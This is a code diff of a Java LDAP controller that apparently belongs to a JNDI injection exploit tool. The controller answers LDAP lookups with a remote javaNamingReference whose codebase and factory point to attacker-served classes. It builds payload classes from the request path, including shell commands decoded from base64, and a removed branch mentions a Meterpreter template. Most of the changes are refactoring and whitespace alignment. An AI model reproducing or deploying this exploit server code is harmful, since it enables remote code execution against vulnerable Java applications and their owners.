@@ -5,7 +5,6 @@ import com.qi4l.jndi.exceptions.IncorrectParamsException;
 import com.qi4l.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
-import com.qi4l.jndi.gadgets.utils.HexUtils;
 import com.qi4l.jndi.gadgets.utils.InjShell;
 import com.qi4l.jndi.gadgets.utils.Util;
 import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
@@ -14,12 +13,6 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-import javassist.ClassPool;
-import javassist.CtClass;
-import org.apache.commons.cli.CommandLine;
-import org.apache.commons.cli.CommandLineParser;
-import org.apache.commons.cli.DefaultParser;
-import org.apache.commons.cli.Options;
 
 import java.net.URL;
 import java.util.Base64;
@@ -31,22 +24,22 @@ import static org.fusesource.jansi.Ansi.ansi;
  */
 @LdapMapping(uri = {"/basic"})
 public class BasicController implements LdapController {
+    private static String     payloadType;
     //最后的反斜杠不能少
-    private final  String      codebase = Config.codeBase;
-    private static String      payloadType;
-    private        String[]    params;
-    private        GadgetType  gadgetType;
+    private final  String     codebase = Config.codeBase;
+    private        String[]   params;
+    private        GadgetType gadgetType;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
             System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + " @|green with basic remote reference payload|@"));
-            Entry     e         = new Entry(base);
-            String    className = "";
+            Entry  e         = new Entry(base);
+            String className = "";
 
             if (payloadType.contains("E-")) {
-                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
+                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
+                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
                 className = EchoClass.getName();
             }
 
@@ -56,7 +49,7 @@ public class BasicController implements LdapController {
                 className = Gadgets.createClassB(ClassName1);
             }
 
-            if (payloadType == "command"){
+            if (payloadType.contains("command")) {
                 CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                 commandTemplate.cache();
                 className = commandTemplate.getClassName();
@@ -69,9 +62,6 @@ public class BasicController implements LdapController {
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaCodeBase", this.codebase);
             e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            if (className.equals("com.feihong.ldap.template.Meterpreter")) {
-                e.addAttribute("javaFactory", "Meterpreter");
-            }
             e.addAttribute("javaFactory", className);
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
@@ -114,10 +104,10 @@ public class BasicController implements LdapController {
             }
 
             if (gadgetType == GadgetType.shell) {
-                String cmd1 = Util.getCmdFromBase(base);
-                byte[] decodedBytes = Base64.getDecoder().decode(cmd1);
-                String cmd = new String(decodedBytes);
-                String[] cmdArray = cmd.split(" ");
+                String   cmd1         = Util.getCmdFromBase(base);
+                byte[]   decodedBytes = Base64.getDecoder().decode(cmd1);
+                String   cmd          = new String(decodedBytes);
+                String[] cmdArray     = cmd.split(" ");
                 System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                 params = cmdArray;
             }
